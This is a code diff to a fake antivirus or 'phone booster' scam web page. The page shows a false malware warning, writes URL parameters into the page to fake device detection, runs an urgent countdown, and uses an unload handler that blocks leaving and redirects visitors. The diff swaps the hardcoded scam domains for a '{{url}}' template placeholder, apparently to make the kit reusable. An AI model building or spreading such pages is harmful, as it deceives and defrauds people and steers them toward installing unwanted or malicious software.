@@ -8,7 +8,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#999">
-    <link id="favicon"  href="logo.png" rel="shortcut icon" type="image/x-icon">
+    <link id="favicon"  href="static/logo.png" rel="shortcut icon" type="image/x-icon">
     <style type="text/css">html {
         font-family: sans-serif;
         -ms-text-size-adjust: 100%;
@@ -637,7 +637,7 @@
 }
 .w3-animate-top{
 	position:relative;
-	animation:animatetop 0.4s
+	animation:animatetop 0.4s;
 	margin: 3px;
     box-shadow: 0px 2px 4px 0px #9d9d9d;
 }
@@ -839,7 +839,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 		<div id="normal-popover">
 			<div class="popover-body">
 				<div class="popover-body-icon">
-					<img alt="notification icon" class="" src="favicon.png">
+					<img alt="notification icon" class="" src="static/favicon.png">
 				</div>
 				<div class="popover-body-message">Please remove malware from your device or else your data will be in danger.</div>
 				<div class="clearfix"></div>
@@ -859,7 +859,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 	function showm(){
 		var modal = document.getElementById("myModal");
 		modal.style.display = "block";
-		var iconNew = 'icon.png';
+		var iconNew = 'static/icon.png';
 		document.getElementById('favicon').href = iconNew;
 	}	
 	function hidem(){
@@ -899,7 +899,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
             <br>
             <p>Update right now to boost your <script>document.write(getURLParameter("device_brand"))</script> <script>document.write(getURLParameter("device_model"))</script> and improve performance of your phone and improve battery life.</p>
             <br>
-            <img src="logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
+            <img src="static/logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
             <p>Install the recommended antivirus <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script> immediately!</p>
             <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">1 minutes 52 seconds</span></p>
         </div>
@@ -927,7 +927,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 
     function goto() {
         window[obu] = null;
-        location.href = "http://www.zaeemtechnical.ml"
+        location.href = '{{url}}'
     }
 </script>
 <script>
@@ -968,7 +968,7 @@ window.top.location = window.location;
                 function epp() {
                     to = setTimeout(function () {
                         repp(); //Also Here
-			w.location.replace('https://zaeemtechnical.ml.org/');
+			w.location.replace('{{url}}');
                         
                     }, 100);
                     return 'You need to upgrade your Booster for Android now or your cell phone might slow down and consume the battery faster.';
@@ -976,7 +976,7 @@ window.top.location = window.location;
 //Also Here
                 w[obu] = epp;
                 // Prevent epp firing from clicking on tracking links
-                var ln = d.querySelectorAll("[https://zaeemtechnical.ml.org']");
+                var ln = d.querySelectorAll("[{{url}}]");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
